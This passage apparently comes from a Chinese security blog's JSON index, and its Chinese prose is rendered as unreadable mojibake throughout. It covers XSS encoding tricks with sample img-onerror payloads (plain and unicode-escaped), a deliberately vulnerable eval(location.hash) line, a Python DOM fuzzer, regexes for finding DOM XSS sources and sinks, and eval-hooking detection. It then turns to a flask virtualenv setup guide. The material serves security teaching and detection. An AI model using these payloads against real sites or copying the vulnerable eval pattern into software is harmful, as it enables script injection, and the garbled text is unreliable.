ï¼Œæ‰€ä»¥å†™åˆ°DOMä¸­æ—¶ç›´æ¥æ˜¾ç¤ºåœ¨é¡µé¢ä¸Šã€‚HTMLä¸­çš„ç¼–ç ï¼š è¿›åˆ¶ç¼–ç ï¼š&#xH;(åå…­è¿›åˆ¶æ ¼å¼)ã€&#D;(åè¿›åˆ¶æ ¼å¼),æœ€åçš„åˆ†å·å¯ä»¥ä¸è¦ HTMLå®ä½“ç¼–ç ï¼šå³ä¸Šé¢çš„é‚£ä¸ªHtmlEncode é‚£ä¹ˆåŒæ ·çš„ï¼Œåœ¨javascriptä¸Šä¸‹æ–‡ç¯å¢ƒä¸­ï¼Œå°†å†…å®¹æ”¹ä¸ºjavascriptçš„ç¼–ç ï¼ŒåŒæ ·ä¼šè‡ªè§£ç ï¼Œæˆ‘ä»¬æ¥çœ‹ä¸‹ä¸€ä¸ªä¾‹å­12345678&lt;input type=&quot;button&quot; id=&quot;exec_btn&quot; value=&quot;exec&quot; /&gt;&lt;script&gt; function $(id)&#123;return document.getElementById(id);&#125;; $(&apos;exec_btn&apos;).onclick=function()&#123; document.write(&apos;&lt;img src=@ onerror=alert(123) /&gt;&apos;); document.write(&apos;\\u003c\\u0069\\u006d\\u0067\\u0020\\u0073\\u0072\\u0063\\u003d\\u0040\\u0020\\u006f\\u006e\\u0065\\u0072\\u0072\\u006f\\u0072\\u003d\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0032\\u0033\\u0029\\u0020\\u002f\\u003e&apos;); &#125; ä¸Šé¢2ä¸­writeå‡ºç°çš„ç»“æœæ˜¯ç›¸åŒçš„ï¼ŒåŒæ ·çš„é“ç†ï¼Œç”±äºä¸Šè¿°ç¼–ç ä¸ºjavascriptçš„ç¼–ç å½¢å¼ï¼Œå¹¶ä¸”åœ¨javascriptçš„ä¸Šä¸‹æ–‡ç¯å¢ƒä¸­ï¼Œä¼šå…ˆè¿›è¡Œè§£ç ï¼Œå†è¿è¡Œjavascriptã€‚JavaScriptä¸­çš„ç¼–ç ï¼š Unicodeå½¢å¼ï¼š\\uH æ™®é€šåå…­è¿›åˆ¶ï¼š\\xH çº¯è½¬ä¹‰ï¼š\\â€™ã€\\â€ã€\\&lt;ã€>è¿™æ ·åœ¨ç‰¹æ®Šå­—ç¬¦å‰åŠ \\è¿›è¡Œè½¬ä¹‰ é€šè¿‡ä¸Šé¢å‡ ä¸ªä¾‹å­ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“åœ¨HTMLä¸­ä¸åœ¨Javascriptä¸­è‡ªåŠ¨è§£ç çš„å·®å¼‚ï¼Œå¦‚æœé˜²å¾¡æ²¡æœ‰åŒºåˆ†è¿™æ ·çš„åœºæ™¯ï¼Œå°±ä¼šå‡ºç°é—®é¢˜ã€‚ ç†è§£äº†ä¸Šè¿°çš„è‡ªè§£ç æœºåˆ¶ï¼Œåœ¨ä¸åŒçš„æ ‡ç­¾ä¸‹ä¼šæœ‰ä¸åŒçš„ç»“æœï¼Œæ¯”å¦‚ä¸€ä¸‹å‡ ä¸ªæ ‡ç­¾ä¼šè‡ªå¸¦HtmlEncodeåŠŸèƒ½12345678&lt;title&gt;&lt;/title&gt;&lt;iframe&gt;&lt;/iframe&gt;&lt;noscript&gt;&lt;/noscript&gt;&lt;noframes&gt;&lt;/noframes&gt;&lt;textarea&gt;&lt;/textarea&gt;&lt;xmp&gt;&lt;/xmp&gt;&lt;plaintext&gt;&lt;/plaintext&gt; &lt;xmp&gt;æ²¡æœ‰HtmlEncodeåŠŸèƒ½ï¼Œ&lt;plaintext&gt;åœ¨Firefoxä¸‹ä¼šè¿›è¡ŒHtmlEncodeç¼–ç ï¼Œåœ¨chromeä¸‹ä¸ä¼šã€‚ DOM fuzzing ç›´æ¥çœ‹ä»£ç æŠŠ ä¸‹é¢çš„ç¨‹åºç”¨pythonç¼–å†™123456789101112131415161718192021222324252627282930313233def get_template(template_file): &quot;&quot;&quot;è·å–fuzzingçš„æ¨¡æ¿æ–‡ä»¶å†…å®¹&quot;&quot;&quot; content=&apos;&apos; with open(template_file) as f: content=f.read() return contentdef set_result(result_file,result): &quot;&quot;&quot;ç”Ÿæˆfuzzingç»“æœæ–‡ä»¶&quot;&quot;&quot; with open(result_file,&apos;w&apos;) as f: f.write(result)def fuzzing(fuzz_file,result_file): template=get_template(fuzz_file) fuzz_area_0=template.find(&apos;&lt;fuzz&gt;&apos;) fuzz_area_1=template.find(&apos;&lt;/fuzz&gt;&apos;) fuzz_area=template[fuzz_area_0+6:fuzz_area_1].strip() # chars=[] chars=[] for i in xrange(255): # ASCIIç›è½¬æ¢ä¸ºå­—ç¬¦ if i!=62: chars.append(chr(i)) fuzz_area_result=&apos;&apos; for c in chars: #éå†è¿™äº›å­—ç¬¦ é€ä¸€ç”Ÿæˆfuzzingå†…å®¹ fuzz_area_r=fuzz_area.replace(&apos;&#123;&#123;char&#125;&#125;&apos;,c) fuzz_area_r=fuzz_area_r.replace(&apos;&#123;&#123;id&#125;&#125;&apos;,str(ord(c))) fuzz_area_result+=fuzz_area_r+&apos;\\n&apos; print fuzz_area_r result=template.replace(fuzz_area,fuzz_area_result) set_result(result_file,result)if __name__==&apos;__main__&apos;: fuzzing(&quot;fuzz_xss_0.html&quot;,&quot;res.html&quot;) ä¸‹é¢ä¸ºfuzz_xss_0.htmlçš„å†…å®¹12345678910111213141516171819202122232425&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Fuzz xss 0&lt;/title&gt; &lt;script&gt; function $(x)&#123;return document.getElementById(x);&#125; function f(id)&#123; $(&apos;result&apos;).innerHTML+=id+&apos;&lt;br/&gt;&apos;; &#125; &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;h3&gt;Fuzzing Result:&lt;/h3&gt;&lt;code&gt; &#123;&#123;id&#125;&#125;: &lt;&#123;&#123;char&#125;&#125;script&gt;f(&quot;&#123;&#123;id&#125;&#125;&quot;)&lt;/script&gt;&lt;/code&gt;&lt;div id=&quot;result&quot;&gt;&lt;/div&gt;&lt;br/&gt;&lt;h3&gt;Fuzzing...&lt;/h3&gt;&lt;fuzz&gt; &#123;&#123;id&#125;&#125;: &lt;&#123;&#123;char&#125;&#125;script&gt;f(&quot;&#123;&#123;id&#125;&#125;&quot;)&lt;/script&gt;&lt;br/&gt;&lt;/fuzz&gt;&lt;/body&gt;&lt;/html&gt; é€šè¿‡ä¸Šé¢çš„fuzzingæŠ€å·§ï¼Œå¯ä»¥è‡ªè¡Œæ‰©å±• DOM XSS æŒ–æ˜ é™æ€æ–¹æ³• é™æ€æ–¹æ³•æŸ¥æ‰¾å±é™©å…³é”®å­—ï¼Œå¯ä»¥ä½¿ç”¨ä¸‹åˆ—æ­£åˆ™è¡¨è¾¾å¼æ¥åŒ¹é…ã€‚123456789101112131415Finding SourcesThe following regular expression attempts to match most common DOMXSS sources (BETA):/(location\\s*[\\[.])|([.\\[]\\s*[&quot;&apos;]?\\s*(arguments|dialogArguments|innerHTML|write(ln)?|open(Dialog)?|showModalDialog|cookie|URL|documentURI|baseURI|referrer|name|opener|parent|top|content|self|frames)\\W)|(localStorage|sessionStorage|Database)/Finding SinksThe following regular expression attempts to match most common DOMXSS sinks (BETA):/((src|href|data|location|code|value|action)\\s*[&quot;&apos;\\]]*\\s*\\+?\\s*=)|((replace|assign|navigate|getResponseHeader|open(Dialog)?|showModalDialog|eval|evaluate|execCommand|execScript|setTimeout|setInterval)\\s*[&quot;&apos;\\]]*\\s*\\()/This regular expression finds sinks based on jQuery, it also finds the $ function, which is not always insecure:/after\\(|\\.append\\(|\\.before\\(|\\.html\\(|\\.prepend\\(|\\.replaceWith\\(|\\.wrap\\(|\\.wrapAll\\(|\\$\\(|\\.globalEval\\(|\\.add\\(|jQUery\\(|\\$\\(|\\.parseHTML\\(/ è¯¦æƒ…å¯ä»¥çœ‹https://code.google.com/archive/p/domxsswiki/wikis/FindingDOMXSS.wikiä¸€æ—¦å‘ç°é¡µé¢å­˜åœ¨å¯ç–‘ç‰¹å¾ï¼Œå°±è¿›è¡Œäººå·¥åˆ†æï¼Œè¿™æ˜¯é™æ€æ–¹æ³•çš„ä»£ä»·ï¼Œå¯¹äººå·¥å‚ä¸è¦æ±‚å¾ˆé«˜ åŠ¨æ€æ–¹æ³• åŠ¨æ€æ–¹æ³•ç›¸å½“äºä¸€æ¬¡Javascriptæºç åŠ¨æ€å®¡è®¡çš„è¿‡ç¨‹ã€‚ä¹¦ä¸­æåˆ°äº†ä¸¤ç§æ€è·¯123&lt;script&gt;eval(location.hash.substr(1));&lt;/script&gt; å°±æ‹¿ä¸Šé¢çš„ä¾‹å­æ¥è¯´ï¼Œå¦‚ä½•æ£€æµ‹ä¸Šé¢çš„DOM XSS æ€è·¯ä¸€ å€Ÿç”¨æµè§ˆå™¨è‡ªèº«çš„åŠ¨æ€æ€§ï¼Œå¯ä»¥å†™Firefoxæ’ä»¶ï¼Œæ‰¹é‡å¯¹ç›®æ ‡åœ°å€å‘èµ·è¯·æ±‚ï¼ˆä¸€ä¸ªæ¨¡ç³Šæµ‹è¯•çš„è¿‡ç¨‹ï¼‰ï¼Œè¯·æ±‚çš„å½¢å¼ä¸ºï¼šåœ¨ç›®æ ‡åœ°å€ååŠ ä¸Š#fuzzingå†…å®¹ï¼Œå°±å½“å‰è¿™ä¸ªä¾‹å­æ¥è¯´ã€‚æ¯”å¦‚å½“å‰fuzzingå†…å®¹ä¸ºï¼švar x=&#39;d0mx55&#39; å¹¶ä¸”å¯¹å¸¸è§çš„è¾“å‡ºç‚¹å‡½æ•°è¿›è¡ŒåŠ«æŒï¼Œå¦‚123456var _eval=eval;eval=function(x)&#123; if(typeof(x)==&apos;undefined&apos;)&#123;return;&#125; if(x.indexOf(&apos;d0mx55&apos;)!=-1)&#123;alert(&apos;found dom xss&apos;); _eval(x);&#125;; åœ¨javascriptå±‚é¢åŠ«æŒinnerHTMLè¿™æ ·çš„å±æ€§å·²ç»æ²¡é‚£ä¹ˆå®¹æ˜“äº†ï¼Œå¸¸ç”¨çš„å±æ€§åŠ«æŒå¯ä»¥é’ˆå¯¹å…·ä½“çš„å¯¹è±¡è®¾ç½®__defineSetter__ï¼Œæ¯”å¦‚ä¸‹é¢çš„ä»£ç 12window.__defineSetter__(&apos;x&apos;,function()&#123;alert(&apos;hijack x&apos;)&#125;);window.x=&apos;xxxxxYYYYYYYY&apos;; å½“xèµ‹å€¼çš„æ—¶å€™ï¼Œå°±ä¼šè§¦å‘äº‹å…ˆå®šä¹‰å¥½çš„Setteræ–¹æ³•ã€‚innerHTMLå±æ€§å±äºé‚£äº›èŠ‚ç‚¹å¯¹è±¡ï¼Œæƒ³åŠ«æŒå…·ä½“èŠ‚ç‚¹å¯¹è±¡çš„innerHTMLï¼Œéœ€è¦äº‹å…ˆçŸ¥é“è¿™ä¸ªå…·ä½“èŠ‚ç‚¹çš„å¯¹è±¡ï¼Œç„¶åè®¾ç½®__defineSetter__,è¿™æ ·å¦‚æœè¦æ£€æµ‹DOM XSSï¼Œå°±è¦åŠ«æŒæ‰€æœ‰çš„è¾“å‡ºç‚¹ï¼Œæ¯”è¾ƒéº»çƒ¦ï¼Œé‚£ä¹ˆæ€è·¯äºŒå¯èƒ½ä¼šæ¯”è¾ƒç®€å•ä¸€ç‚¹ æ€è·¯äºŒ ä»ç„¶å€Ÿç”¨æµè§ˆå™¨åŠ¨æ€æ‰§è¡Œçš„ä¼˜åŠ¿ï¼Œå†™ä¸€ä¸ªFirefoxæ’ä»¶ï¼Œæˆ‘ä»¬å®Œå…¨ä»¥é»‘ç›’çš„æ–¹å¼è¿›è¡Œæ¨¡ç³Šæµ‹è¯•è¾“å…¥ç‚¹ï¼Œç„¶ååˆ¤æ–­æ¸²æŸ“åçš„DOMæ ‘ä¸­æ˜¯å¦æœ‰æˆ‘ä»¬æœŸå¾…çš„å€¼ï¼Œæ¯”å¦‚ï¼Œæ¨¡ç³Šæµ‹è¯•çš„å†…å®¹éƒ½æœ‰å¦‚ä¸‹ä¸€æ®µä»£ç document.write(&#39;d0m&#39;+&#39;x55&#39;)å¦‚æœè¿™æ®µä»£ç é¡ºåˆ©æ‰§è¡Œäº†å°±ä¼šå­˜åœ¨d0mx55æ–‡æœ¬èŠ‚ç‚¹ï¼Œåç»­çš„æ£€æµ‹å·¥ä½œåªè¦åˆ¤æ–­æ˜¯å¦å­˜åœ¨è¿™ä¸ªæ–‡æœ¬èŠ‚ç‚¹å°±å¯ä»¥äº†123if(document.documentElement.innerHTML.indexOf(&apos;d0mx55&apos;)!=-1)&#123; alert(&apos;found dom xss&apos;);&#125; è¿™ä¸ªæ€è·¯ä»¥DOMæ ‘çš„æ”¹å˜ä¸ºåˆ¤æ–­ä¾æ®ï¼Œç®€å•å‡†ç¡®ï¼Œä½†æ˜¯åŒæ ·æ— æ³•é¿å…é‚£äº›é€»è¾‘åˆ¤æ–­ä¸Šå¯¼è‡´çš„æ¼æŠ¥ã€‚ é™„å½• è¾“å‡ºç‚¹ javascript code ç›´æ¥è¾“å‡ºHTMLå†…å®¹ document.write(â€¦)document.writeln(â€¦) document.body.innerHtml=â€¦ ç›´æ¥ä¿®æ”¹DOMæ ‘ï¼ˆåŒ…æ‹¬DHTMLäº‹ä»¶ï¼‰ document.forms[0].action=â€¦document.attachEvent(â€¦)document.createâ€¦(â€¦)document.execCommand(â€¦)document.body. â€¦widow.attachEvent(â€¦) æ›¿æ¢document url document.location=â€¦(ä»¥åŠç›´æ¥èµ‹å€¼ç»™locationçš„href,host,hostnameå±æ€§)document.location.hostname=â€¦document.location.replace(â€¦)document.location.assign(â€¦)documnent.URL=â€¦window.navigate(â€¦) æ‰“å¼€æˆ–ä¿®æ”¹æ–°çª—å£ document.open(â€¦)window.open(â€¦)window.location.href=â€¦(ä»¥åŠç›´æ¥èµ‹å€¼ç»™locationçš„href,host,hostnameå±æ€§) ç›´æ¥æ‰§è¡Œè„šæœ¬ eval(â€¦)window.execScript(â€¦)window.setInterval(â€¦)window.setTimeout(â€¦)"},{"title":"ã€OTHERSã€‘flask virtualenvç¯å¢ƒæ­å»º","permalink":"http://blog.0kami.cn/2016/03/16/old-flask-virtualenv/","text":"å¼•è¨€python virtualenvä¸ºflaskç­‰webæ¡†æ¶æä¾›è™šæ‹Ÿpythonç¯å¢ƒï¼ˆå…¶ä»–åº”ç”¨ä¹Ÿå¯ä»¥ï¼‰ï¼Œè¿™æ ·å¯ä»¥é˜²æ­¢å¼€å‘è¿‡ç¨‹ä¸­å®‰è£…çš„ä¾èµ–å½±å“åŸä¸»æœºä¸Šçš„pythonç¯å¢ƒï¼Œè€Œä¸”åœ¨è¿ç§»åˆ°ä¸Šçº¿ç¯å¢ƒä¸­æ—¶ï¼Œçœå»äº†é…ç½®ä¸Šçº¿ç¯å¢ƒä¸­çš„pythonè¿è¡Œç¯å¢ƒã€‚ å®‰è£…virtualenv è¿™é‡Œæˆ‘æ¨èä½¿ç”¨pipæˆ–è€…easy_installå®‰è£…ï¼ŒåŒæ ·ä¹Ÿå¯ä»¥é€šè¿‡ä¸‹è½½virtualenv.pyæ¥æ„å»ºè™šæ‹Ÿç¯å¢ƒã€‚ ä½¿ç”¨pipå‘½ä»¤ pip install virtualenv å»ºç«‹ç¯å¢ƒ é¦–å…ˆè¿›å…¥ç½‘ç«™çš„æ ¹ç›®å½•ï¼ˆæˆ–è€…æ˜¯ä»»ä½•éœ€è¦å»ºç«‹è™šæ‹Ÿç¯å¢ƒçš„æ–‡ä»¶å¤¹ä¸‹ï¼‰ ä½¿ç”¨doså‘½ä»¤ virtualenv venv å…¶ä¸­venvä¸ºpythonçš„è™šæ‹Ÿç¯å¢ƒï¼Œå…¶ä¸­åŒ…æ‹¬äº†python.exeã€pipã€easy_installç­‰pythonç¯å¢ƒã€‚ æ¿€æ´»ç¯å¢ƒ å®Œæˆä¸Šä¸€æ­¥åï¼Œæ¥ä¸‹æ¥éœ€è¦åœ¨dosç•Œé¢æ¿€æ´»è™šæ‹Ÿç¯å¢ƒï¼Œè¿™æ ·å¯ä»¥ä½¿å¾—æ¥ä¸‹æ¥ä¸‹è½½çš„pythonæ¨¡å—éƒ½ä½äºvenvä¸‹çš„pipç¯å¢ƒä¸­Scripts\\activate æ¿€æ´»è™šæ‹Ÿç¯å¢ƒdeactivate é€€å‡ºè™šæ‹Ÿç¯å¢ƒ æ¿€æ´»åå‘½ä»¤è¡Œå¼€å¤´å¤šäº†ï¼ˆvenvï¼‰ï¼Œå¦‚ä¸‹12E:\\code\\python-workplace\\flasker\\venv&gt;Scripts\\activate(venv) E:\\code\\python-workplace\\flasker\\venv&gt; å®‰è£…æ¨¡å— åœ¨ä¸Šé¢çš„åŸºç¡€ä¸‹ï¼Œé€šè¿‡pip install xxxxå®‰è£…çš„æ¨¡å—éƒ½æ˜¯å®‰è£…åœ¨venvç¯å¢ƒä¸‹çš„ï¼Œå¯¹ä¸»æœºä¸Šçš„ç¯å¢ƒæ²¡æœ‰å½±å“ã€‚ å¼•å…¥è·¯å¾„ åœ¨å…·ä½“ä½¿ç”¨è¿‡ç¨‹ä¸­ï¼Œéœ€è¦æŠŠvenvçš„è·¯å¾„å¯¼å…¥sys.pathï¼Œè¿™æ ·æ‰å¯ä»¥ä½¿ç”¨è™šæ‹Ÿç¯å¢ƒä¸­çš„pythonæ¨¡å—ã€‚12importos,syssys.path.append(os.getcwd()+'\\\\venv\\\\Lib\\\\site-packages') åˆ°è¿™é‡Œå°±å®Œæˆäº†pythonè™šæ‹Ÿç¯å¢ƒçš„æ­å»ºï¼Œæ€»ä½“å¯¹ç»å¸¸å˜åŠ¨ç¼–ç¨‹ç¯å¢ƒçš„åŸæ—­çŒ¿æ¥è¯´è¿™æ˜¯ä¸ªéå¸¸æœ‰ç”¨åŠŸèƒ½ã€‚ ==The End=="}]}